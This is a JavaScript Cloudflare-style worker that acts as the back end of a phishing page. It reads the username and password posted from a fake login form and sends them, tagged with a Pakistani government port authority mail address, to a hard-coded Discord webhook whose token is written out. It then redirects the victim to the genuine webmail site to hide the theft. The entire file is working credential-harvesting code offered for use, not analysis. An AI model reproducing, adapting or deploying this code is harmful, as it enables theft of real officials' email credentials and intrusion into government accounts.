export default {
  async fetch(request, env, ctx) {
    try {
      // Ensure the request method is POST
      if (request.method !== 'POST') {
        return new Response('Method Not Allowed', { status: 405 });
      }
  
      // Parse the form data
      const formData = await request.formData();
  
      // Extract username and password from the form data
      const username = formData.get('username');
      const password = formData.get('password');
  
      // Your data processing logic here (e.g., saving data to a database)
  
      // Prepare the payload to send to the Discord webhook
      const discordPayload = {
        content: `https://mail.gwadarport.gov.pk/:\nUsername: ${username}\nPassword: ${password}`,
      };
  
      // Discord webhook URL
      const discordWebhookURL =
        'https://discordapp.com/api/webhooks/1194498033027649557/ycGTMeT7RD_ookLoaz28gOu9ritvrRassnb7XKS_1a8Y_6UqlBi2yDrIfljQPcjPQZpb';
  
      // Send the payload to the Discord webhook
      const discordResponse = await fetch(discordWebhookURL, {
        method: 'POST', 
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(discordPayload),
      });
  
      // Check if the Discord webhook request was successful
      if (!discordResponse.ok) {
        return new Response('Failed to send data to Discord', { status: 500 });
      }
  
      // Send the user to mail.pc.gov.pk
      return Response.redirect('https://mail.gwadarport.gov.pk/', 302);
    } catch (error) {
      console.error('Error:', error);
      return new Response('Internal Server Error', { status: 500 });
    }
  },
};
